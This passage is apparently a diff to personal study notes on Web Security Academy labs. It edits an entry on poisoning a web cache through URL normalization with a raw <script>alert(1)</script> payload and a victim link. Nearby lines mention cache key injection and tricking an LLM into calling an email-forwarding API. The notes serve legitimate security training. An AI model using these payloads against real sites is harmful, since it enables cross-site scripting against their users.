@@ -3930,10 +3930,10 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Response: alert(1)({"country":"United Kingdom"}
 - **URL normalization**
   - Poison the page
-    GET %2f<script>alert(1)</script>
-    Response: <p>Not Found: /%3Cscript%3Ealert(1)%3C/script%3E</p>
+    GET /<script>alert(1)</script> 
+    Response: <p>Not Found: /<script>alert(1)</script></p>
   - Deliver the link to victim
-    `https://0a7e007f04ff0a3380a767ec005e001f.web-security-academy.net/%3Cscript%3Ealert(1)%3C/script%3E`
+    `https://0a7e007f04ff0a3380a767ec005e001f.web-security-academy.net/<script>alert(1)</script>`
 - **Cache key injection (Expert)**
   - identify unkeyed param: "utm_content"
   - GET /js/localize.js?lang=en
